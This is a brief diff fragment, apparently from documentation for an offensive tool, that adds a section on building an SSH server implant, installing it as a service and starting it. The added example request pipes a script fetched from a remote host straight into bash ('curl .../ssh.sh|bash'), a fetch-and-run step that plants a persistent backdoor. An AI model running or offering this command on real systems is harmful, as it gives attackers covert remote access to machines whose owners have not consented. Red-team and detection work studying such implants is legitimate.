@@ -47,3 +47,11 @@ data:
     fi
 
 ---
+
+Build an SSH server implant for the specific platform and install it as a service, then start the service.
+
+### Example Request
+
+```bash
+curl xodbox/ssh.sh|bash
+```
